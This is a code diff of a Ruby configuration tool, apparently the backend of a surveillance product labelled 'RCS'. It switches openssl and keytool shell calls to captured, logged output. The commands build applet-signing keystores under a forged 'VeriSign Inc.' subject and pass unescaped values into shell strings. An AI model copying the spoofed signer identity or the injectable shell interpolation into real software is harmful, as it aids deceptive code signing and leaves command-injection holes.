@@ -238,7 +238,7 @@ class Config
     unless resp['Set-Cookie'].nil?
       cookie = resp['Set-Cookie']
     else
-      trace :info, "Invalid authentication"
+      trace :fatal, "Invalid authentication"
       return
     end
 
@@ -274,27 +274,33 @@ class Config
         subj = "/CN=\"RCS Certification Authority\"/O=\"HT srl\""
         # if specified...
         subj = "/CN=\"#{options[:ca_name]}\"" if options[:ca_name]
-        system "openssl req -subj #{subj} -batch -days 3650 -nodes -new -x509 -keyout rcs-ca.key -out rcs-ca.crt -config openssl.cnf"
+        out = `openssl req -subj #{subj} -batch -days 3650 -nodes -new -x509 -keyout rcs-ca.key -out rcs-ca.crt -config openssl.cnf 2>&1`
+        trace :info, out if $log
       end
 
       return unless File.exist? 'rcs-ca.crt'
 
       trace :info, "Generating db certificate..."
       # the cert for the db server
-      system "openssl req -subj /CN=#{@global['CN']} -batch -days 3650 -nodes -new -keyout #{@global['DB_KEY']} -out rcs-db.csr -config openssl.cnf"
+      out = `openssl req -subj /CN=#{@global['CN']} -batch -days 3650 -nodes -new -keyout #{@global['DB_KEY']} -out rcs-db.csr -config openssl.cnf 2>&1`
+      trace :info, out if $log
 
       return unless File.exist? @global['DB_KEY']
 
       trace :info, "Generating collector certificate..."
       # the cert used by the collectors
-      system "openssl req -subj /CN=collector -batch -days 3650 -nodes -new -keyout rcs-collector.key -out rcs-collector.csr -config openssl.cnf"
+      out = `openssl req -subj /CN=collector -batch -days 3650 -nodes -new -keyout rcs-collector.key -out rcs-collector.csr -config openssl.cnf 2>&1`
+      trace :info, out if $log
 
       return unless File.exist? 'rcs-collector.key'
 
       trace :info, "Signing certificates..."
       # signing process
-      system "openssl ca -batch -days 3650 -out #{@global['DB_CERT']} -in rcs-db.csr -extensions server -config openssl.cnf"
-      system "openssl ca -batch -days 3650 -out rcs-collector.crt -in rcs-collector.csr -config openssl.cnf"
+      out = `openssl ca -batch -days 3650 -out #{@global['DB_CERT']} -in rcs-db.csr -extensions server -config openssl.cnf 2>&1`
+      trace :info, out if $log
+
+      out = `openssl ca -batch -days 3650 -out rcs-collector.crt -in rcs-collector.csr -config openssl.cnf 2>&1`
+      trace :info, out if $log
 
       return unless File.exist? @global['DB_CERT']
 
@@ -378,11 +384,13 @@ class Config
   def generate_keystores
     trace :info, "Generating key stores for Java Applet..."
     FileUtils.rm_rf(Config.instance.cert('applet.keystore'))
-    system "keytool -genkey -alias signapplet -dname \"CN=VeriSign Inc., O=Default, C=US\" -validity 18250 -keystore #{Config.instance.cert('applet.keystore')} -keypass #{Config.instance.global['CERT_PASSWORD']} -storepass #{Config.instance.global['CERT_PASSWORD']}"
+    out = `keytool -genkey -alias signapplet -dname \"CN=VeriSign Inc., O=Default, C=US\" -validity 18250 -keystore #{Config.instance.cert('applet.keystore')} -keypass #{Config.instance.global['CERT_PASSWORD']} -storepass #{Config.instance.global['CERT_PASSWORD']} 2>&1`
+    trace :info, out if $log
 
     trace :info, "Generating key stores for Android..."
     FileUtils.rm_rf(Config.instance.cert('android.keystore'))
-    system "keytool -genkey -dname \"cn=Server, ou=JavaSoft, o=Sun, c=US\" -alias ServiceCore -keystore #{Config.instance.cert('android.keystore')} -keyalg RSA -keysize 2048 -validity 18250 -keypass #{Config.instance.global['CERT_PASSWORD']} -storepass #{Config.instance.global['CERT_PASSWORD']}"
+    out = `keytool -genkey -dname \"cn=Server, ou=JavaSoft, o=Sun, c=US\" -alias ServiceCore -keystore #{Config.instance.cert('android.keystore')} -keyalg RSA -keysize 2048 -validity 18250 -keypass #{Config.instance.global['CERT_PASSWORD']} -storepass #{Config.instance.global['CERT_PASSWORD']} 2>&1`
+    trace :info, out if $log
   end
 
   def use_pfx_cert(pfx)
@@ -391,15 +399,25 @@ class Config
 
     trace :info, "Using pfx cert to create Java Applet keystore..."
     FileUtils.rm_rf(Config.instance.cert('applet.keystore'))
-    system "openssl pkcs12 -in #{pfx} -out pfx.pem -passin pass:#{Config.instance.global['CERT_PASSWORD']} -passout pass:#{Config.instance.global['CERT_PASSWORD']} -chain"
-    system "openssl pkcs12 -export -in pfx.pem -out pfx.p12 -name signapplet -passin pass:#{Config.instance.global['CERT_PASSWORD']} -passout pass:#{Config.instance.global['CERT_PASSWORD']}"
-    system "keytool -importkeystore -srckeystore pfx.p12 -destkeystore #{Config.instance.cert('applet.keystore')} -srcstoretype pkcs12 -deststoretype JKS -srcstorepass #{Config.instance.global['CERT_PASSWORD']} -deststorepass #{Config.instance.global['CERT_PASSWORD']}"
+    out = `openssl pkcs12 -in #{pfx} -out pfx.pem -passin pass:#{Config.instance.global['CERT_PASSWORD']} -passout pass:#{Config.instance.global['CERT_PASSWORD']} -chain 2>&1`
+    trace :info, out if $log
+
+    out = `openssl pkcs12 -export -in pfx.pem -out pfx.p12 -name signapplet -passin pass:#{Config.instance.global['CERT_PASSWORD']} -passout pass:#{Config.instance.global['CERT_PASSWORD']} 2>&1`
+    trace :info, out if $log
+
+    out = `keytool -importkeystore -srckeystore pfx.p12 -destkeystore #{Config.instance.cert('applet.keystore')} -srcstoretype pkcs12 -deststoretype JKS -srcstorepass #{Config.instance.global['CERT_PASSWORD']} -deststorepass #{Config.instance.global['CERT_PASSWORD']} 2>&1`
+    trace :info, out if $log
 
     trace :info, "Using pfx cert to create Android keystore..."
     FileUtils.rm_rf(Config.instance.cert('android.keystore'))
-    system "openssl pkcs12 -in #{pfx} -out pfx.pem -passin pass:#{Config.instance.global['CERT_PASSWORD']} -passout pass:#{Config.instance.global['CERT_PASSWORD']} -chain"
-    system "openssl pkcs12 -export -in pfx.pem -out pfx.p12 -name ServiceCore -passin pass:#{Config.instance.global['CERT_PASSWORD']} -passout pass:#{Config.instance.global['CERT_PASSWORD']}"
-    system "keytool -importkeystore -srckeystore pfx.p12 -destkeystore #{Config.instance.cert('android.keystore')} -srcstoretype pkcs12 -deststoretype JKS -srcstorepass #{Config.instance.global['CERT_PASSWORD']} -deststorepass #{Config.instance.global['CERT_PASSWORD']}"
+    out = `openssl pkcs12 -in #{pfx} -out pfx.pem -passin pass:#{Config.instance.global['CERT_PASSWORD']} -passout pass:#{Config.instance.global['CERT_PASSWORD']} -chain 2>&1`
+    trace :info, out if $log
+
+    out = `openssl pkcs12 -export -in pfx.pem -out pfx.p12 -name ServiceCore -passin pass:#{Config.instance.global['CERT_PASSWORD']} -passout pass:#{Config.instance.global['CERT_PASSWORD']} 2>&1`
+    trace :info, out if $log
+
+    out = `keytool -importkeystore -srckeystore pfx.p12 -destkeystore #{Config.instance.cert('android.keystore')} -srcstoretype pkcs12 -deststoretype JKS -srcstorepass #{Config.instance.global['CERT_PASSWORD']} -deststorepass #{Config.instance.global['CERT_PASSWORD']} 2>&1`
+    trace :info, out if $log
 
     # remove temporary files
     ['pfx.pem', 'pfx.p12'].each do |f|
@@ -469,7 +487,7 @@ class Config
     self.class_eval do
       def trace(level, message)
         puts message
-        File.open(File.join($execution_directory, "log/rcs-db-config.log"), 'a') {|f| f.write "#{Time.now} #{message}\n"} if $log
+        File.open(File.join($execution_directory, "log/rcs-db-config.log"), 'a') {|f| f.write "#{Time.now} [#{level}] #{message}\n"} if $log
       end
     end
 
